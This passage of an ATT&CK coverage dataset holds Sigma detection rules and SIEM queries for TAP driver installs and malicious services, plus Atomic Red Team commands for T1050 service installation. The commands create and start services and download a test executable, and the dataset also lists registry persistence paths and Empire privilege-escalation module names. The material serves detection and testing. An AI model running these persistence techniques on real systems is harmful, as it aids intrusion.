\"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Tap driver installation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Tap-driver-installation-2 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Tap driver installation\",\\n    \"description\": \"Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques\",\\n    \"tags\": [\\n      \"attack.exfiltration\",\\n      \"attack.t1048\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"6\\\\\" AND ImagePath.keyword:*tap0901*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"6\\\\\" AND ImagePath.keyword:*tap0901*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Tap driver installation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Tap-driver-installation-3 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Tap driver installation\",\\n    \"description\": \"Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques\",\\n    \"tags\": [\\n      \"attack.exfiltration\",\\n      \"attack.t1048\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4697\\\\\" AND ImagePath.keyword:*tap0901*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4697\\\\\" AND ImagePath.keyword:*tap0901*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Tap driver installation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"7045\" AND ImagePath.keyword:*tap0901*)\\n(EventID:\"6\" AND ImagePath.keyword:*tap0901*)\\n(EventID:\"4697\" AND ImagePath.keyword:*tap0901*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"7045\" ImagePath=\"*tap0901*\")\\n(EventID=\"6\" ImagePath=\"*tap0901*\")\\n(EventID=\"4697\" ImagePath=\"*tap0901*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"7045\" ImagePath=\"*tap0901*\")\\n(event_id=\"6\" ImagePath=\"*tap0901*\")\\n(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4697\" ImagePath=\"*tap0901*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*7045)(?=.*.*tap0901.*))'\\ngrep -P '^(?:.*(?=.*6)(?=.*.*tap0901.*))'\\ngrep -P '^(?:.*(?=.*4697)(?=.*.*tap0901.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Tap installer execution\nid: 99793437-3e16-439b-be0f-078782cf953d\ndescription: Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques\nstatus: experimental\nauthor: Daniil Yugoslavskiy, Ian Davis, oscd.community\ndate: 2019/10/24\ntags:\n    - attack.exfiltration\n    - attack.t1048\nlogsource:\n     category: process_creation\n     product: windows\ndetection:\n    selection:\n        Image|endswith: '\\tapinstall.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate OpenVPN TAP insntallation\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Tap installer execution\nid: 99793437-3e16-439b-be0f-078782cf953d\ndescription: Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques\nstatus: experimental\nauthor: Daniil Yugoslavskiy, Ian Davis, oscd.community\ndate: 2019/10/24\ntags:\n    - attack.exfiltration\n    - attack.t1048\nlogsource:\n     category: process_creation\n     product: windows\ndetection:\n    selection:\n        Image|endswith: '\\tapinstall.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate OpenVPN TAP insntallation\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Image.keyword:*\\\\\\\\tapinstall.exe", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Tap-installer-execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Tap installer execution\",\\n    \"description\": \"Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques\",\\n    \"tags\": [\\n      \"attack.exfiltration\",\\n      \"attack.t1048\"\\n    ],\\n    \"query\": \"Image.keyword:*\\\\\\\\\\\\\\\\tapinstall.exe\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Image.keyword:*\\\\\\\\\\\\\\\\tapinstall.exe\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Tap installer execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Image.keyword:*\\\\\\\\tapinstall.exe", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "Image=\"*\\\\\\\\tapinstall.exe\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\tapinstall.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^.*\\\\tapinstall\\\\.exe'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1050/T1050.yaml", "command": "sc.exe create AtomicTestService binPath= #{binary_path}\nsc.exe start AtomicTestService\n", "name": null}, {"source": "atomics/T1050/T1050.yaml", "command": "sc.exe create AtomicTestService binPath= PathToAtomicsFolder\\T1050\\bin\\AtomicService.exe\nsc.exe start AtomicTestService\n", "name": null}, {"source": "atomics/T1050/T1050.yaml", "command": "New-Service -Name \"AtomicTestService\" -BinaryPathName \"#{binary_path}\" 2>&1 | Out-Null\nStart-Service -Name \"AtomicTestService\"\n", "name": null}, {"source": "atomics/T1050/T1050.yaml", "command": "New-Service -Name \"AtomicTestService\" -BinaryPathName \"PathToAtomicsFolder\\T1050\\bin\\AtomicService.exe\" 2>&1 | Out-Null\nStart-Service -Name \"AtomicTestService\"\n", "name": null}, {"source": "Threat Hunting Tables", "command": "*.exe (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "\\AppData\\*", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "HKCU\\software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "*.exe (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "$Recycle.bin\\*", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "*.exe (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "Temp\\*", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "*.exe (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "Users\\Public\\*", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "*.exe (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "Users\\Default\\*", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "*.exe (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKEY_USERS\\*\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand", "name": "registry_path"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_exe_restore", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_exe_restore", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_exe_stager", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_exe_stager", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_exe_useradd", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_exe_useradd", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_stager", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_stager", "name": "Empire Module Command"}], "command_list": ["sc.exe create AtomicTestService binPath= #{binary_path}\nsc.exe start AtomicTestService\n", "sc.exe create AtomicTestService binPath= PathToAtomicsFolder\\T1050\\bin\\AtomicService.exe\nsc.exe start AtomicTestService\n", "New-Service -Name \"AtomicTestService\" -BinaryPathName \"#{binary_path}\" 2>&1 | Out-Null\nStart-Service -Name \"AtomicTestService\"\n", "New-Service -Name \"AtomicTestService\" -BinaryPathName \"PathToAtomicsFolder\\T1050\\bin\\AtomicService.exe\" 2>&1 | Out-Null\nStart-Service -Name \"AtomicTestService\"\n", "*.exe (query|add)", "\\AppData\\*", "HKCU\\software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "*.exe (query|add)", "$Recycle.bin\\*", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "*.exe (query|add)", "Temp\\*", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "*.exe (query|add)", "Users\\Public\\*", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "*.exe (query|add)", "Users\\Default\\*", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "*.exe (query|add)", "HKEY_USERS\\*\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand", "powershell/privesc/powerup/service_exe_restore", "powershell/privesc/powerup/service_exe_restore", "powershell/privesc/powerup/service_exe_stager", "powershell/privesc/powerup/service_exe_stager", "powershell/privesc/powerup/service_exe_useradd", "powershell/privesc/powerup/service_exe_useradd", "powershell/privesc/powerup/service_stager", "powershell/privesc/powerup/service_stager"], "technique_id": "T1050", "parsed_datasets": [{"Atomic Red Team Test - Service Installation": {"display_name": "Service Installation", "atomic_tests": [{"dependencies": [{"description": "Service binary must exist on disk at specified location (#{binary_path})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1050/bin/AtomicService.exe\" -OutFile \"#{binary_path}\"\n", "prereq_command": "if (Test-Path #{binary_path}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Service Installation", "executor": {"elevation_required": true, "command": "sc.exe create #{service_name} binPath= #{binary_path}\nsc.exe start #{service_name}\n", "name": "command_prompt", "cleanup_command": "sc.exe stop #{service_name}\nsc.exe delete #{service_name}\n"}, "description": "Installs A Local Service\n", "input_arguments": {"service_name": {"default": "AtomicTestService", "type": "String", "description": "Name of the Service"}, "binary_path": {"default": "PathToAtomicsFolder\\T1050\\bin\\AtomicService.exe", "type": "Path", "description": "Name of the service binary, include path."}}, "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "Service binary must exist on disk at specified location (#{binary_path})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1050/bin/AtomicService.exe\" -OutFile \"#{binary_path}\"\n", "prereq_command": "if (Test-Path #{binary_path}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Service Installation PowerShell Installs A Local Service using PowerShell", "executor": {"elevation_required": true, "command": "New-Service -Name \"#{service_name}\" -BinaryPathName \"#{binary_path}\" 2>&1 | Out-Null\nStart-Service -Name \"#{service_name}\"\n", "name": "powershell", "cleanup_command": "Stop-Service -Name \"#{service_name}\" 2>&1 | Out-Null\ntry {(Get-WmiObject Win32_Service -filter \"name='#{service_name}'\").Delete()}\ncatch {}"}, "description": "Installs A Local Service via PowerShell\n", "input_arguments": {"service_name": {"default": "AtomicTestService", "type": "String", "description": "Name of the Service"}, "binary_path": {"default": "PathToAtomicsFolder\\T1050\\bin\\AtomicService.exe", "type": "Path", "description": "Name of the service binary, include path."}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1050"}}, {"Threat Hunting Tables": {"mitre_attack": "T1050", "file_value": "", "file_path": "\\AppData\\*", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100109", "registry_value": "", "mitre_caption": "new_service", "registry_path": "HKCU\\software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "frequency": "high", "commandline_string": "(query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1050", "file_value": "", "file_path": "$Recycle.bin\\*", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100110", "registry_value": "", "mitre_caption": "new_service", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "frequency": "rare", "commandline_string": "(query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1050", "file_value": "", "file_path": "Temp\\*", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100111", "registry_value": "", "mitre_caption": "new_service", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "frequency": "high", "commandline_string": "(query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1050", "file_value": "", "file_path": "Users\\Public\\*", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100112", "registry_value": "", "mitre_caption": "new_service", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "frequency": "high", "commandline_string": "(query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1050", "file_value": "", "file_path": "Users\\Default\\*", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100113", "registry_value": "", "mitre_caption": "new_service", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "frequency": "high", "commandline_string": "(query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1050", "file_value": "", "file_path": "", "parent_process": "*.exe", "itw_sample": "https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe", "chain_id": "100114", "registry_value": "", "mitre_caption": "new_service", "registry_path": "HKEY_USERS\\*\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand", "frequency": "low", "commandline_string": "(query|add)", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1050", "Empire Module": "powershell/privesc/powerup/service_exe_restore", "Technique": "New Service", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/powerup/service_exe_restore\":  [\"T1050\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1050", "Empire Module": "powershell/privesc/powerup/service_exe_stager", "Technique": "New Service", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/powerup/service_exe_stager\":  [\"T1050\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1050", "Empire Module": "powershell/privesc/powerup/service_exe_useradd", "Technique": "New Service", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/powerup/service_exe_useradd\":  [\"T1050\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1050", "Empire Module": "powershell/privesc/powerup/service_stager", "Technique": "New Service", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/powerup/service_stager\":  [\"T1050\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_path contains \"sc.exe\"or process_path contains \"powershell.exe\"or process_path contains \"cmd.exe\")and (process_command_line contains \"*New-Service*BinaryPathName*\"or process_command_line contains \"*sc*create*binpath*\"or process_command_line contains \"*Get-WmiObject*Win32_Service*create*\")", "product": "Azure Sentinel", "name": "New Service Process"}, {"query": "title: Suspicious Driver Load from Temp\nid: 2c4523d5-d481-4ed0-8ec3-7fbf0cb41a75\ndescription: Detects a driver load from a temporary directory\nauthor: Florian Roth\ntags:\n    - attack.persistence\n    - attack.t1050\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 6\n        ImageLoaded: '*\\Temp\\\\*'\n    condition: selection\nfalsepositives:\n    - there is a relevant set of false positives depending on applications in the environment \nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Driver Load from Temp\nid: 2c4523d5-d481-4ed0-8ec3-7fbf0cb41a75\ndescription: Detects a driver load from a temporary directory\nauthor: Florian Roth\ntags:\n    - attack.persistence\n    - attack.t1050\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 6\n        ImageLoaded: '*\\Temp\\\\*'\n    condition: selection\nfalsepositives:\n    - there is a relevant set of false positives depending on applications in the environment \nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"6\" AND ImageLoaded.keyword:*\\\\\\\\Temp\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Driver-Load-from-Temp <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Driver Load from Temp\",\\n    \"description\": \"Detects a driver load from a temporary directory\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1050\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"6\\\\\" AND ImageLoaded.keyword:*\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"6\\\\\" AND ImageLoaded.keyword:*\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Driver Load from Temp\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"6\" AND ImageLoaded.keyword:*\\\\\\\\Temp\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"6\" ImageLoaded=\"*\\\\\\\\Temp\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"6\" ImageLoaded=\"*\\\\\\\\Temp\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*6)(?=.*.*\\\\Temp\\\\\\\\.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Malicious Service Installations\nid: 5a105d34-05fc-401e-8553-272b45c1522d\ndescription: Detects known malicious service installs that only appear in cases of lateral movement, credential dumping and other suspicious activity\nauthor: Florian Roth, Daniil Yugoslavskiy, oscd.community (update)\ndate: 2017/03/27\nmodified: 2019/11/01\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1050\n    - car.2013-09-005\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: 7045\n    malsvc_paexec:\n        ServiceFileName|contains: '\\PAExec'\n    malsvc_wannacry:\n        ServiceName: 'mssecsvc2.0'\n    malsvc_persistence:\n        ServiceFileName|contains: 'net user'\n    condition: selection and 1 of malsvc_*\nfalsepositives: \n    - Penetration testing\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Malicious Service Installations\nid: 5a105d34-05fc-401e-8553-272b45c1522d\ndescription: Detects known malicious service installs that only appear in cases of lateral movement, credential dumping and other suspicious activity\nauthor: Florian Roth, Daniil Yugoslavskiy, oscd.community (update)\ndate: 2017/03/27\nmodified: 2019/11/01\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1050\n    - car.2013-09-005\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: 7045\n    malsvc_paexec:\n        ServiceFileName|contains: '\\PAExec'\n    malsvc_wannacry:\n        ServiceName: 'mssecsvc2.0'\n    malsvc_persistence:\n        ServiceFileName|contains: 'net user'\n    condition: selection and 1 of malsvc_*\nfalsepositives: \n    - Penetration testing\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"7045\" AND (ServiceFileName.keyword:*\\\\\\\\PAExec* OR ServiceName:\"mssecsvc2.0\" OR ServiceFileName.keyword:*net\\\\ user*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Malicious-Service-Installations <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Malicious Service Installations\",\\n    \"description\": \"Detects known malicious service installs that only appear in cases of lateral movement, credential dumping and other suspicious activity\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1050\",\\n      \"car.2013-09-005\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"7045\\\\\" AND (ServiceFileName.keyword:*\\\\\\\\\\\\\\\\PAExec* OR ServiceName:\\\\\"mssecsvc2.0\\\\\" OR ServiceFileName.keyword:*net\\\\\\\\ user*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"7045\\\\\" AND (ServiceFileName.keyword:*\\\\\\\\\\\\\\\\PAExec* OR ServiceName:\\\\\"mssecsvc2.0\\\\\" OR ServiceFileName.keyword:*net\\\\\\\\ user*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Malicious Service Installations\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"7045\" AND (ServiceFileName.keyword:*\\\\\\\\PAExec* OR ServiceName:\"mssecsvc2.0\" OR ServiceFileName.keyword:*net user*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"7045\" (ServiceFileName=\"*\\\\\\\\PAExec*\" OR ServiceName=\"mssecsvc2.0\" OR ServiceFileName=\"*net user*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"7045\" (ServiceFileName=\"*\\\\\\\\PAExec*\" OR service=\"mssecsvc2.0\" OR ServiceFileName=\"*net user*\"))", "product": "Atomic Threat Coverage", 